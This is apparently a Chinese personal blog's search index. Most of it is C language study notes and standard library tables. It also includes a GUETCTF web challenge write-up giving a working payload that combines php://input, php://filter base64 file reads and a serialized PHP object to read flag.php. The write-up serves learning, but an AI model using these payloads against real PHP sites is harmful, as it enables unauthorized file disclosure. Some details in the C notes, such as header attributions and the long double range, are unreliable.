<td>所分配的内存区地址如内存不够，返回0</td>
</tr>
<tr>
<td>realloc</td>
<td>void *realloc(void *p,unsigned size)</td>
<td>将p所指的以分配的内存区的大小改为size。size可比原来的空间大或小</td>
<td>返回指向该内存区的指针。若重新分配失败，则返回NULL</td>
</tr>
</tbody></table>
</li>
</ul>
<hr>
<h2 id="6-其他函数"><a href="#6-其他函数" class="headerlink" title="6.其他函数"></a><strong>6.其他函数</strong></h2><ul>
<li>在使用这些函数时，应该在源文件中使用预编译命令：<pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span></code></pre>
<table>
<thead>
<tr>
<th>函数名</th>
<th>函数原型</th>
<th>功能</th>
<th>返回值</th>
</tr>
</thead>
<tbody><tr>
<td>abs</td>
<td>int abs(int num)</td>
<td>计算整数num的绝对值</td>
<td>返回计算结果</td>
</tr>
<tr>
<td>atof</td>
<td>double atof(char *str)</td>
<td>将str指向的字符串转换为一个double型的指</td>
<td>返回双精度计算结果</td>
</tr>
<tr>
<td>atoi</td>
<td>int atoi(char *str)</td>
<td>将str指向的字符串转换为int型的值</td>
<td>返回转换结果</td>
</tr>
<tr>
<td>atol</td>
<td>long atol(cahr *str)</td>
<td>将str指向的字符串转换为一个long型的值</td>
<td>返回转换结果</td>
</tr>
<tr>
<td>exit</td>
<td>void exit(int status)</td>
<td>中止程序运行。将status的值返回调用的过程</td>
<td>无</td>
</tr>
<tr>
<td>itoa</td>
<td>char *itoa(int n,char *str,int radix)</td>
<td>将整数n的值按照radix进制转换为等价的字符串，并将结果存入str指向的字符串中</td>
<td>返回一个指向str的指针</td>
</tr>
<tr>
<td>labs</td>
<td>long labs（long num）</td>
<td>计算long型的整数num的绝对值</td>
<td>返回计算结果</td>
</tr>
<tr>
<td>ltoa</td>
<td>char *ltoa(long n,char *str,int radix)</td>
<td>将长整数n的值按照radix进制转换为等价的字符串，并将结果存入str指向的字符串</td>
<td>返回一个指向str的指针</td>
</tr>
<tr>
<td>rand</td>
<td>int rand()</td>
<td>产生0到RAND_MAX之间的伪随机数。RAND_MAX在头文件中定义(头文件为time.h)</td>
<td>返回一个伪随机（整）数</td>
</tr>
<tr>
<td>random</td>
<td>int random（int num）</td>
<td>产生0到num之间的随机数(头文件为time.h)</td>
<td>返回一个随机（整）数</td>
</tr>
<tr>
<td>randomize</td>
<td>void randomize()</td>
<td>初始化随机函数，使用时包括头文件time.h</td>
<td></td>
</tr>
</tbody></table>
</li>
</ul>
]]></content>
      <categories>
        <category>C语言</category>
        <category>编程</category>
      </categories>
      <tags>
        <tag>编程</tag>
      </tags>
  </entry>
  <entry>
    <title>GUETCTF-WEB3-writeup</title>
    <url>/2019/10/26/GUETCTF_web3_wp/</url>
    <content><![CDATA[<p>[TOC]</p>
<h2 id="GUETCTF-web3-wp"><a href="#GUETCTF-web3-wp" class="headerlink" title="GUETCTF-web3-wp"></a>GUETCTF-web3-wp</h2><p>打开网页是一个登陆界面，f12查看源码：</p>
<a id="more"></a>

<pre><code>&lt;!--  
$user = $_GET[&quot;username&quot;];  
$file = $_GET[&quot;file&quot;];  
$pass = $_GET[&quot;pass&quot;];  

if(isset($user)&amp;&amp;(file_get_contents($user,&#39;r&#39;)===&quot;i-am-admin&quot;)){  
    echo &quot;hello admin!&lt;br&gt;&quot;;  
    include($file); //hint.php  
}else{  
    echo &quot;you are not admin ! &quot;;  
}  
 --&gt;  </code></pre><hr>
<ol>
<li>一开始直接让<strong>username=i-am-admin</strong>但登陆失败</li>
</ol>
<p>发现思路是<font color="green">让file_get_content($user,’r’)===”i-am-admin”，所以要用伪协议php://input传入参数</font>。</p>
<blockquote>
<p>php：//input可以得到原始的post数据</p>
</blockquote>
<hr>
<ol start="2">
<li>接下来要想办法<strong>包含hint.php</strong></li>
</ol>
<ul>
<li>这里用到php的另一个封装协议：php://filter<br>利用这个协议就可以读取任意文件<br><font color="green">利用方法：php://filter/convert.base64-encode/resource=hint.php</font></li>
</ul>
<p>这里把读取到的hint.php的内容转换为base64的格式，<br>于是构造payload:</p>
<pre><code>?user=php://input&amp;file=php://filter/convert.base64-encode/resource=hint.php</code></pre><p>在线解码后得到hint.php</p>
<pre><code>&lt;?php  
error_reporting(0);
class Flag{//flag.php  
    public $file;  
    public function __tostring(){  
        if(isset($this-&gt;file)){  
            echo file_get_contents($this-&gt;file); 
            echo &quot;&lt;br&gt;&quot;;
        return (&quot;This is your flag!&quot;);
        }  
    }  
}  
?&gt;  </code></pre><hr>
<p>但我们不能直接访问flag.php，因为</p>
<pre><code>if(preg_match(&quot;/flag/&quot;,$file)){
        exit();</code></pre><p>回到源码发现需要用<strong>反序列化</strong>读取flag.php文件<br>于是根据hint.php构造</p>
<pre><code>O:4:&quot;Flag&quot;:1:{s:4:&quot;file&quot;;s:57:&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;;}</code></pre><p>得到一串base64直接解码就能得到flag</p>
<hr>
<p>总的payload是:</p>
<pre><code>?user=php://input&amp;file=hint.php&amp;pass=O:4:&quot;Flag&quot;:1:{s:4:&quot;file&quot;;s:57:&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;;}</code></pre><p>(同时post参数i-am-admin)</p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>Writeup</category>
        <category>WEB安全</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>Hello</title>
    <url>/2019/10/25/Hello/</url>
    <content><![CDATA[<h2 id="Who-am-I"><a href="#Who-am-I" class="headerlink" title="Who am I"></a>Who am I</h2><p><font color="green">你好，我是九九，ID：Doublenine。来自GDUT<br></font></p>
<a id="more"></a>

<p>想开始写博客，为了记录一下自己的所学所见，也为了督促自己学习。</p>
<hr>
<p><strong>希望你能多多支持我！</strong></p>
]]></content>
  </entry>
  <entry>
    <title>C语言学习笔记</title>
    <url>/2020/05/05/C%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<h1 id="C语言学习笔记"><a href="#C语言学习笔记" class="headerlink" title="C语言学习笔记"></a>C语言学习笔记</h1><hr>
<p>[TOC]</p>
<h2 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a><strong>数据类型</strong></h2><h3 id="1-基本类型"><a href="#1-基本类型" class="headerlink" title="1.基本类型"></a>1.基本类型</h3><ul>
<li>整数型：int、short int、long int、long long int<blockquote>
<p>short int ≤ int ≤ long int≤ long long int</p>
</blockquote>
</li>
<li>浮点型：float、double、long double</li>
<li>字符型：char</li>
<li>布尔型：_Bool</li>
<li>枚举型(不常用)：enum</li>
</ul>
<hr>
<h4 id="sizeof运算符"><a href="#sizeof运算符" class="headerlink" title="sizeof运算符"></a>sizeof运算符</h4><blockquote>
<ul>
<li>概念：sizeof运算符用于获得数据类型或表达式长度</li>
<li>用法：</li>
</ul>
</blockquote>
<pre class=" language-c"><code class="language-c"><span class="token keyword">sizeof</span><span class="token punctuation">(</span>object<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//查看对象长度 等价于sizeof object;</span>
<span class="token keyword">sizeof</span><span class="token punctuation">(</span>type_name<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//查看数据类型</span></code></pre>
<hr>
<h4 id="类型限制符"><a href="#类型限制符" class="headerlink" title="类型限制符"></a>类型限制符</h4><blockquote>
<ul>
<li>signed：表示变量带符号位（可存放负数）</li>
<li>unsigned：表示变量不带符号位（不能存放负数，但意味着<font color="red">能存放更大的值</font>）</li>
</ul>
</blockquote>
<blockquote>
<ul>
<li>用法：<blockquote>
<ul>
<li>[signed] short [int]</li>
<li>unsigned short [int]</li>
<li>[signed] int</li>
<li>unsigned int</li>
<li>[signed] long [int]</li>
<li>unsigned long [int]</li>
<li>[signed] long long [int]</li>
<li>unsigned long long [int]</li>
</ul>
</blockquote>
</li>
</ul>
</blockquote>
<h3 id="2-指针类型"><a href="#2-指针类型" class="headerlink" title="2.指针类型"></a>2.指针类型</h3><h3 id="3-构造类型"><a href="#3-构造类型" class="headerlink" title="3.构造类型"></a>3.构造类型</h3><ul>
<li><p>数组类型</p>
</li>
<li><p>结构类型</p>
</li>
<li><p>联合类型</p>
</li>
</ul>
<h3 id="4-空类型"><a href="#4-空类型" class="headerlink" title="4.空类型"></a>4.空类型</h3><hr>
<hr>
<h2 id="取值范围"><a href="#取值范围" class="headerlink" title="取值范围"></a><strong>取值范围</strong></h2><h3 id="1-单位"><a href="#1-单位" class="headerlink" title="1.单位"></a>1.单位</h3><ul>
<li>比特位（bit）:CPU能读懂的最小单位</li>
<li>字节（Byte）：内存机构的最小寻址单位</li>
<li>换算：1 Byte == 8 bit</li>
</ul>
<hr>
<h3 id="2-进制换算"><a href="#2-进制换算" class="headerlink" title="2.进制换算"></a>2.进制换算</h3><table>
<thead>
<tr>
<th>二进制</th>
<th>十进制</th>
<th>十六进制</th>
</tr>
</thead>
<tbody><tr>
<td>0</td>
<td>0</td>
<td>0</td>
</tr>
<tr>
<td>1</td>
<td>1</td>
<td>1</td>
</tr>
<tr>
<td>10</td>
<td>2</td>
<td>2</td>
</tr>
<tr>
<td>11</td>
<td>3</td>
<td>3</td>
</tr>
<tr>
<td>100</td>
<td>4</td>
<td>4</td>
</tr>
<tr>
<td>101</td>
<td>5</td>
<td>5</td>
</tr>
<tr>
<td>110</td>
<td>6</td>
<td>6</td>
</tr>
<tr>
<td>111</td>
<td>7</td>
<td>7</td>
</tr>
<tr>
<td>1000</td>
<td>8</td>
<td>8</td>
</tr>
<tr>
<td>1001</td>
<td>9</td>
<td>9</td>
</tr>
<tr>
<td>1010</td>
<td>10</td>
<td>A</td>
</tr>
<tr>
<td>1011</td>
<td>11</td>
<td>B</td>
</tr>
<tr>
<td>1100</td>
<td>12</td>
<td>C</td>
</tr>
<tr>
<td>1101</td>
<td>13</td>
<td>D</td>
</tr>
<tr>
<td>1110</td>
<td>14</td>
<td>E</td>
</tr>
<tr>
<td>1111</td>
<td>15</td>
<td>F</td>
</tr>
<tr>
<td>10000</td>
<td>16</td>
<td>10</td>
</tr>
<tr>
<td>10001</td>
<td>17</td>
<td>11</td>
</tr>
<tr>
<td>…</td>
<td>…</td>
<td>…</td>
</tr>
<tr>
<td>11111111</td>
<td>255</td>
<td>FF</td>
</tr>
</tbody></table>
<ul>
<li>十进制二进制转换：2的n次方减1</li>
</ul>
<hr>
<h3 id="3-符号位"><a href="#3-符号位" class="headerlink" title="3.符号位"></a>3.符号位</h3><ul>
<li><p>存放signed的类型的储存单元中，左边第一位表示符号位，如果该位为1就表示该数为负，如果该位为0就表示该数为正</p>
</li>
<li><p>一个32位的整形变量，除去左边第一个符号位，剩下表示的值只有31个比特位</p>
</li>
</ul>
<hr>
<h3 id="4-补码"><a href="#4-补码" class="headerlink" title="4.补码"></a>4.补码</h3><ul>
<li><p>正数的补码是该数的二进制形式</p>
</li>
<li><p>负数的补码通过几个步骤取得：</p>
<p>1.先取得该数的绝对值的二进制形式</p>
<p>2.将第一步的值按位取反（把1变为0，把0变成1）</p>
<p>3.将第二步的值加一</p>
</li>
</ul>
<hr>
<h3 id="5-基本数据类型的取值范围"><a href="#5-基本数据类型的取值范围" class="headerlink" title="5.基本数据类型的取值范围"></a>5.基本数据类型的取值范围</h3><table>
<thead>
<tr>
<th>数据类型</th>
<th>字节数</th>
<th>取值范围</th>
</tr>
</thead>
<tbody><tr>
<td>char</td>
<td>1</td>
<td>-128 ~ 127</td>
</tr>
<tr>
<td>unsigned char</td>
<td>1</td>
<td>0 ~ 255</td>
</tr>
<tr>
<td>short</td>
<td>2</td>
<td>-32768 ~ 32767</td>
</tr>
<tr>
<td>unsigned short</td>
<td>2</td>
<td>0 ~ 65535</td>
</tr>
<tr>
<td>int</td>
<td>4</td>
<td>-2147483648 ~ 2147483647</td>
</tr>
<tr>
<td>unsigned int</td>
<td>4</td>
<td>0 ~ 4294967295</td>
</tr>
<tr>
<td>long</td>
<td>4</td>
<td>-2147483648 ~ 2147483647</td>
</tr>
<tr>
<td>unsigned long</td>
<td>4</td>
<td>0 ~ 4294967295</td>
</tr>
<tr>
<td>long long</td>
<td>8</td>
<td>-9223372036854775808 ~ 9223372036854775807</td>
</tr>
<tr>
<td>unsigned long long</td>
<td>8</td>
<td>0 ~ 18446744073709551615</td>
</tr>
<tr>
<td>float</td>
<td>4</td>
<td>1.7549 * 10^-38 ~ 3.40282 * 10^38</td>
</tr>
<tr>
<td>double</td>
<td>8</td>
<td>2.22507 * 10^-308 ~ 1.79765 * 10^308</td>
</tr>
<tr>
<td>long double</td>
<td>12</td>
<td>2.22507 * 10^-308 ~ 1.79765 * 10^108</td>
</tr>
</tbody></table>
<hr>
<hr>
<h2 id="字符与字符串"><a href="#字符与字符串" class="headerlink" title="字符与字符串"></a><strong>字符与字符串</strong></h2><h3 id="1-ASCII表"><a href="#1-ASCII表" class="headerlink" title="1.ASCII表"></a>1.ASCII表</h3><p><img src="https://timgsa.baidu.com/timg?image&quality=80&size=b9999_10000&sec=1538458003104&di=4b3f3ad99e68ea4b01f90fe5504ee854&imgtype=0&src=http%3A%2F%2Fimg.bimg.126.net%2Fphoto%2FnjtcLwoNWZ51joclAWjzKw%3D%3D%2F308215099515025170.jpg" alt></p>
<h3 id="2-字符串"><a href="#2-字符串" class="headerlink" title="2.字符串"></a>2.字符串</h3><pre class=" language-c"><code class="language-c"><span class="token keyword">char</span> 变量名<span class="token punctuation">[</span>数量<span class="token punctuation">]</span><span class="token punctuation">;</span>

变量名<span class="token punctuation">[</span>索引号<span class="token punctuation">]</span> <span class="token operator">=</span> 字符<span class="token punctuation">;</span>

<span class="token comment" spellcheck="true">//声明字符串</span>
<span class="token keyword">char</span> name<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

<span class="token comment" spellcheck="true">//给字符串赋值</span>
name<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'N'</span><span class="token punctuation">;</span>
name<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'i'</span><span class="token punctuation">;</span>
name<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'n'</span><span class="token punctuation">;</span>
name<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'e'</span><span class="token punctuation">;</span>
name<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'K'</span><span class="token punctuation">;</span></code></pre>
<ul>
<li>注意在末尾添加\0 , 否则会出现乱码</li>
</ul>
<hr>
<hr>
<h2 id="字符与字符串-1"><a href="#字符与字符串-1" class="headerlink" title="字符与字符串"></a><strong>字符与字符串</strong></h2><h3 id="运算符："><a href="#运算符：" class="headerlink" title="运算符："></a>运算符：</h3><ul>
<li>C语言通过提供运算符来支持我们对数据的处理</li>
</ul>
<h4 id="1-算术运算符"><a href="#1-算术运算符" class="headerlink" title="1.算术运算符:"></a>1.算术运算符:</h4><p><img src="https://fishc.com.cn/forum.php?mod=image&aid=41750&size=400x300&key=3d2c5badf61607a4&type=1" alt></p>
<ul>
<li>目：操作数的个数</li>
<li>表达式：用运算符和括号将操作数连接起来的式子<br>比如：1 + 1、a + b</li>
</ul>
<ul>
<li>类型转换：<br>(数据类型)值</li>
</ul>
<hr>
<h4 id="2-关系运算符"><a href="#2-关系运算符" class="headerlink" title="2.关系运算符"></a>2.关系运算符</h4><ul>
<li>使用关系运算符来比较两个数的大小关系</li>
</ul>
<p><img src="https://fishc.com.cn/forum.php?mod=image&aid=41978&size=400x300&key=879f47f9d6645672&type=1" alt></p>
<ul>
<li>关系表达式：用关系运算符将两边的变量、数据或表达式连接起来，称之为关系表达式</li>
</ul>
<blockquote>
<p>如：1&lt;2、a&gt;b、(a=3) &gt; (b=5)</p>
</blockquote>
<blockquote>
<p>关系表达式得到的值是一个逻辑值，即判断结果为“真”或“假”，如果结果为“真”，关系表达式的值为 1，如果为“假”，关系表达式的值则为 0。</p>
</blockquote>
<hr>
<h4 id="3-逻辑运算符"><a href="#3-逻辑运算符" class="headerlink" title="3..逻辑运算符"></a>3..逻辑运算符</h4><ul>
<li><p>C语言总共提供了三种逻辑运算符：<br><img src="https://fishc.com.cn/forum.php?mod=image&aid=41969&size=400x300&key=c0bbd69ffca9fa16&type=1" alt></p>
</li>
<li><p>逻辑表达式：用逻辑运算符将两边的变量、数据或表达式连接起来，称之为逻辑表达式</p>
</li>
</ul>
<blockquote>
<p>如:3 &gt; 1 &amp;&amp; 1 &lt; 2</p>
</blockquote>
<ul>
<li><font color="red">注：关系表达式和逻辑表达式得到的值都是一个逻辑值，也就是表示真的 1 和表示假的 0。但是用于判断一个值是否为真时，以 0 表示假，以任何非 0 的数表示真。一个是编译系统告诉我们的结果，一个是我们让编译系统去判断的，两者方向不同。</font></li>
</ul>
<h4 id="4-运算符的优先级和结合性："><a href="#4-运算符的优先级和结合性：" class="headerlink" title="4.运算符的优先级和结合性："></a>4.运算符的优先级和结合性：</h4><p><img src="https://timgsa.baidu.com/timg?image&quality=80&size=b9999_10000&sec=1538459732544&di=5b4838d7669173551b05c2fbfd33eab3&imgtype=0&src=http%3A%2F%2Fd.hiphotos.baidu.com%2Fzhidao%2Fpic%2Fitem%2Fb8389b504fc2d562b63ab678e71190ef76c66c70.jpg" alt></p>
<h4 id="5-短路求值"><a href="#5-短路求值" class="headerlink" title="5.短路求值"></a>5.短路求值</h4><ul>
<li><p>短路求值又称最小化求值，是一种逻辑运算符的求值策略。只有当第一个运算数的值无法确定逻辑运算的结果时，才对第二个运算数进行求值。</p>
</li>
<li><p>C 语言对于逻辑与和逻辑或采用短路求值的方式。</p>
</li>
</ul>
<ul>
<li>例如：<pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
</code></pre>
</li>
</ul>
<p>int main()<br>{<br>        int a = 3, b = 3;</p>
<pre><code>    (a = 0) &amp;&amp; (b = 5);
    printf(&quot;a = %d, b = %d\n&quot;, a, b);

    (a = 1) || (b = 5);
    printf(&quot;a = %d, b = %d\n&quot;, a, b);

    return 0;</code></pre><p>}</p>
<pre><code>结果为：![](https://fishc.com.cn/forum.php?mod=image&amp;aid=41970&amp;size=400x300&amp;key=3d6e6c06c1d0cd8f&amp;type=1)

***
***

## **if语句**
### 语句1
```c
if(表达式){
    ...   //逻辑值为真所执行的语句或程序块
}</code></pre><hr>
<h3 id="语句2"><a href="#语句2" class="headerlink" title="语句2"></a>语句2</h3><pre class=" language-c"><code class="language-c"><span class="token keyword">if</span> <span class="token punctuation">(</span>表达式<span class="token number">1</span><span class="token punctuation">)</span> 
<span class="token punctuation">{</span>
    …… <span class="token comment" spellcheck="true">// 逻辑值为真所执行的语句、程序块</span>
<span class="token punctuation">}</span>
<span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>表达式<span class="token number">2</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    …… <span class="token comment" spellcheck="true">// 逻辑值为真所执行的语句、程序块</span>
<span class="token punctuation">}</span>
<span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>表达式<span class="token number">3</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    …… <span class="token comment" spellcheck="true">// 逻辑值为真所执行的语句、程序块</span>
<span class="token punctuation">}</span></code></pre>
<hr>
<hr>
<h2 id="switch语句与分支嵌套"><a href="#switch语句与分支嵌套" class="headerlink" title="switch语句与分支嵌套"></a><strong>switch语句与分支嵌套</strong></h2><h3 id="1-switch语句"><a href="#1-switch语句" class="headerlink" title="1.switch语句"></a>1.switch语句</h3><pre class=" language-c"><code class="language-c"><span class="token keyword">switch</span> <span class="token punctuation">(</span>表达式<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token keyword">case</span> 常量表达式<span class="token number">1</span><span class="token punctuation">:</span> 语句或程序块
    <span class="token keyword">case</span> 常量表达式<span class="token number">2</span><span class="token punctuation">:</span> 语句或程序块
    ……
    <span class="token keyword">case</span> 常量表达式n：语句或程序块
    <span class="token keyword">default</span><span class="token punctuation">:</span> 语句或程序块 
<span class="token punctuation">}</span></code></pre>
<ul>
<li>这里每个 case 后边的常量是匹配 switch 后边表达式的值</li>
<li>case 后边必须跟一个常量值，而不能是一个范围</li>
<li>如果所有的 case 均没有匹配的，那么执行 default 的内容</li>
<li>default 是可选的，如果没有 default，并且所有的 case 均不匹配，那么 switch 语句不执行任何动作</li>
</ul>
<hr>
<h3 id="2-使用-break-语句跳出"><a href="#2-使用-break-语句跳出" class="headerlink" title="2. 使用 break 语句跳出"></a>2. 使用 break 语句跳出</h3><ul>
<li>switch 语句中的 case 和 default 事实上都是“标签”，用来标志一个位置而已。</li>
<li>当 switch 跳到某个位置之后，就会一直往下执行，所以我们这里还需要配合一个 break 语句，让代码在适当的位置跳出 switch。</li>
</ul>
<hr>
<h3 id="3-分支结构的嵌套"><a href="#3-分支结构的嵌套" class="headerlink" title="3. 分支结构的嵌套"></a>3. 分支结构的嵌套</h3><ul>
<li>如果在一个 if 语句中包含另一个 if 语句，我们就称之为 if 语句的嵌套，也叫分支结构的嵌套。<br><img src="https://fishc.com.cn/forum.php?mod=image&aid=42523&size=400x300&key=0c6b31924edebe20&type=1" alt></li>
</ul>
<hr>
<h3 id="4-else悬挂"><a href="#4-else悬挂" class="headerlink" title="4.else悬挂"></a>4.else悬挂</h3><ul>
<li>C 语言中有这样的规则，else 始终与同一对括号内最近的未匹配的 if 结合。</li>
</ul>
<hr>
<h3 id="5-等于号带来的问题"><a href="#5-等于号带来的问题" class="headerlink" title="5. 等于号带来的问题"></a>5. 等于号带来的问题</h3><ul>
<li><p>在 C 语言中使用等号（=）作为赋值运算，使用连续两个等号（==）作为比较运算。一般而言，赋值运算相对于比较运算出现得更频繁，因此字符较少的 = 就被赋予了更常用的含义——赋值操作。</p>
</li>
<li><p>此外，在 C 语言中赋值符号被作为一种操作符对待，因而重复进行赋值操作（如 a = b = c）可以很容易地书写，并且赋值操作还可以被嵌入到更大的表达式中。</p>
</li>
<li><p>但是，这种使用上的便利性可能导致一个潜在的问题：当程序员本意是在作比较运算时，却可能无意中误写成赋值运算</p>
</li>
</ul>
<hr>
<hr>
<h2 id="while语句与do-while语句"><a href="#while语句与do-while语句" class="headerlink" title="while语句与do while语句"></a><strong>while语句与do while语句</strong></h2><h3 id="1-循环结构"><a href="#1-循环结构" class="headerlink" title="1.循环结构"></a>1.循环结构</h3><ul>
<li>当我们需要重复执行同一段代码很多次的时候，就可以使用循环结构来解决。</li>
</ul>
<hr>
<h3 id="2-while语句"><a href="#2-while语句" class="headerlink" title="2.while语句"></a>2.while语句</h3><pre class=" language-c"><code class="language-c"><span class="token keyword">while</span> <span class="token punctuation">(</span>表达式<span class="token punctuation">)</span>
    循环体</code></pre>
<ul>
<li>while 语句的语法非常简单，只要表达式的值为真，那么就会不断执行循环体里边的语句或程序块。<br><img src="https://fishc.com.cn/forum.php?mod=image&aid=42690&size=400x300&key=25005d39fc536b73&type=1" alt></li>
</ul>
<hr>
<h3 id="3-do-while-语句"><a href="#3-do-while-语句" class="headerlink" title="3.do while 语句"></a>3.do while 语句</h3><pre class=" language-c"><code class="language-c"><span class="token keyword">do</span>
    循环体
<span class="token keyword">while</span> <span class="token punctuation">(</span>表达式<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
<ul>
<li><p>while 是先判断表达式，如果表达式结果为真，才执行循环体里边的内容；</p>
</li>
<li><p>而 do…while 则相反，先执行循环体的内容再判断表达式是否为真。</p>
</li>
</ul>
<p><img src="https://fishc.com.cn/forum.php?mod=image&aid=42691&size=400x300&key=de54871239f4aafb&type=1" alt></p>
<ul>
<li><font color="red">注意：do…while 语句在 while 后边一定要用分号（;）表示语句结束。</font></li>
</ul>
<hr>
<hr>
<h2 id="for语句与循环嵌套"><a href="#for语句与循环嵌套" class="headerlink" title="for语句与循环嵌套"></a><strong>for语句与循环嵌套</strong></h2><h3 id="1-循环三要点"><a href="#1-循环三要点" class="headerlink" title="1.循环三要点"></a>1.循环三要点</h3><ul>
<li>初始化计数器</li>
<li>判断循环条件是否满足</li>
<li>更新计数器</li>
</ul>
<hr>
<h3 id="2-for语句"><a href="#2-for语句" class="headerlink" title="2.for语句"></a>2.for语句</h3><pre class=" language-c"><code class="language-c"><span class="token keyword">for</span> <span class="token punctuation">(</span>表达式<span class="token number">1</span><span class="token punctuation">;</span> 表达式<span class="token number">2</span><span class="token punctuation">;</span> 表达式<span class="token number">3</span><span class="token punctuation">)</span>
        循环体</code></pre>
<ul>
<li>三个表达式用分号隔开，其中：</li>
</ul>
<blockquote>
<p>表达式1是循环初始化表达式</p>
</blockquote>
<blockquote>
<p>表达式2是循环条件表达式</p>
</blockquote>
<blockquote>
<p>表达式3是循环调整表达式</p>
</blockquote>
<ul>
<li>特点：</li>
</ul>
<p>for 语句的表达式1，表达式2和表达式3都可以按照需要进行省略（但分号不能省）：</p>
<blockquote>
<p>for ( ; 表达式2; 表达式3)</p>
</blockquote>
<blockquote>
<p>for (表达式1; 表达式2; )</p>
</blockquote>
<blockquote>
<p>for (表达式1; ; )</p>
</blockquote>
<blockquote>
<p>for ( ; ; )</p>
</blockquote>
<blockquote>
<p>……</p>
</blockquote>
<ul>
<li><font color="red">注意：如果目的不是特别明确，建议不要这么做，因为程序的可读性会因此而降低！</font></li>
</ul>
<hr>
<h3 id="3-循环嵌套"><a href="#3-循环嵌套" class="headerlink" title="3. 循环嵌套"></a>3. 循环嵌套</h3><ul>
<li><p>循环结构跟分支结构一样，都可以实现嵌套。</p>
</li>
<li><p>对于嵌套的循环结构，执行顺序是从内到外：先执行内层循环，再执行外层循环。</p>
</li>
</ul>
<hr>
<hr>
<h2 id="break语句和continue语句"><a href="#break语句和continue语句" class="headerlink" title="break语句和continue语句"></a><strong>break语句和continue语句</strong></h2><h3 id="1-break-语句"><a href="#1-break-语句" class="headerlink" title="1.break 语句"></a>1.break 语句</h3><ul>
<li><p>在循环体中，如果我们想要让程序在中途跳出循环，那么我们同样可以使用 break 语句来实现。</p>
</li>
<li><p>执行 break 语句，直接跳出循环体。</p>
</li>
<li><p><font color="red">对于嵌套循环来说，break 语句只负责跳出所在的那一层循环，要跳出外层循环则需要再布置一个 break 语句才行。</font></p>
</li>
</ul>
<hr>
<h3 id="2-continue语句"><a href="#2-continue语句" class="headerlink" title="2.continue语句"></a>2.continue语句</h3><ul>
<li><p>当满足某个条件的时候，跳过本轮循环的内容，直接开始下一轮循环。这时候我们应该使用 continue 语句。</p>
</li>
<li><p>当执行到 continue 语句的时候，循环体的剩余部分将被忽略，直接进入下一轮循环。</p>
</li>
<li><p>对于嵌套循环来说，continue 语句跟 break 语句是一样的：它们都只能作用于一层循环体。</p>
</li>
</ul>
<hr>
<h3 id="3-for-语句和-while-语句执行过程的区别"><a href="#3-for-语句和-while-语句执行过程的区别" class="headerlink" title="3. for 语句和 while 语句执行过程的区别"></a>3. for 语句和 while 语句执行过程的区别</h3><ul>
<li><p>for 语句和 while语句执行过程是有区别的，它们的区别在于出现 continue 语句时。</p>
</li>
<li><p>在 for 语句中，continue语句跳过循环的剩余部分，直接回到调整部分。</p>
</li>
<li><p>在 while 语句中，调整部分是循环体的一部分，因此 continue 语句会把它也跳过。</p>
</li>
</ul>
<hr>
<hr>
<h2 id="数组"><a href="#数组" class="headerlink" title="数组"></a><strong>数组</strong></h2><h3 id="1-数组的含义"><a href="#1-数组的含义" class="headerlink" title="1.数组的含义"></a>1.数组的含义</h3><ul>
<li>数组是储存同类型数据的地方</li>
</ul>
<h3 id="2-定义数组"><a href="#2-定义数组" class="headerlink" title="2.定义数组"></a>2.定义数组</h3><ul>
<li>类型 数组名[常量表达式] 例如：<pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> a<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token keyword">double</span> b<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">;</span></code></pre>
</li>
</ul>
<h3 id="3-访问"><a href="#3-访问" class="headerlink" title="3.访问"></a>3.访问</h3><ul>
<li><p>数组名[下标]</p>
<pre class=" language-c"><code class="language-c">a<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
b<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">;</span></code></pre>
</li>
<li><p><font color="red">第一个元素的下标是0而不是1</font></p>
</li>
</ul>
<h3 id="4-数组的初始化"><a href="#4-数组的初始化" class="headerlink" title="4.数组的初始化"></a>4.数组的初始化</h3><ul>
<li><p>在定义数组的同时对其各个元素进行赋值，称之为数组的初始化</p>
</li>
<li><p>第一种：将所有元素统一初始化为某个值</p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> a<span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token number">9</span><span class="token punctuation">}</span><span class="token punctuation">;</span></code></pre>
</li>
<li><p>第二种：赋不同值，用逗号隔开</p>
